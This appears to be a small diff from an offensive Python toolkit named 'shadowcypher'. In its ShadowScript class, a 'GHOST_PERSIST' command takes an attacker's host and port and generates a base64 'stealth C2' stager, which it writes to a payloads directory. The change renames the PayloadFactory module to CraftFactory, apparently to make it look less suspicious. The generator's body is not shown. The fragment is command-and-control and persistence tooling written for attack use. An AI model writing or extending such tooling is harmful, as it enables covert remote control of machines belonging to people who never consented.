@@ -123,12 +123,12 @@ class ShadowScript:
 
         if cmd == "GHOST_PERSIST":
             import os
-            from shadowcypher.modules.payload_factory import PayloadFactory
+            from shadowcypher.modules.craft_factory import CraftFactory
             lhost, sep, lport = args_raw.partition(":")
             if not lhost or not sep:
                 return {"ok": False, "msg": "GHOST_PERSIST requires 'lhost:lport' args"}
             try:
-                stager_b64 = PayloadFactory.generate_stealth_c2_python(lhost, int(lport))
+                stager_b64 = CraftFactory.generate_stealth_c2_python(lhost, int(lport))
             except Exception as e:
                 return {"ok": False, "msg": f"GHOST_PERSIST failed: {e}"}
             os.makedirs("payloads", exist_ok=True)
